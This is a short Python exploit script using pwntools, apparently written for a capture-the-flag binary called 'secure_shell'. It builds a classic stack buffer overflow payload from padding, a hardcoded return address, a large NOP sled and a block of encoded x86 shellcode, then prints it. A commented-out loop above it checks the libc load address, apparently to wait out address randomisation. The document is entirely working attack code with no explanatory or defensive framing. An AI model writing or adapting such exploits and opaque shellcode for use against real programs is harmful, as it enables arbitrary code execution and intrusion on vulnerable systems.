# import subprocess
# string = '0xf7db2000'
#
# for i in range(1000):
#   result = subprocess.check_output('ldd ./secure_shell | grep -i libc', shell=True)
#   if string in result.decode('utf-8'):
#      print(f"matched: {string}")

import os
from pwn import *

junk = b'A' * 48
nop_sled = b'\x90' * 1500
eip = p32(0xffffd620 + 200)

shell_code =  b""
shell_code += b"\xdd\xc3\xd9\x74\x24\xf4\x5b\x33\xc9\xb1\x0f"
shell_code += b"\xb8\x03\x23\xc2\x04\x83\xc3\x04\x31\x43\x14"
shell_code += b"\x03\x43\x17\xc1\x37\x35\xcc\x6f\xaf\x6e\x3f"
shell_code += b"\xef\xfe\x55\xd5\xde\x58\xa7\xa9\x75\x52\x6f"
shell_code += b"\x30\xdb\x02\xe7\x6f\xbf\x43\x10\x07\x10\x27"
shell_code += b"\xb7\xd7\x06\xe8\x25\xbe\xb8\x7f\x4a\x12\xad"
shell_code += b"\x88\x8d\x92\x2d\xa6\xef\xfb\x43\x97\x9c\x93"
shell_code += b"\x9b\xb0\x31\xea\x7d\xf3\x36"

payload = junk + eip + nop_sled + shell_code
sys.stdout.buffer.write(payload)
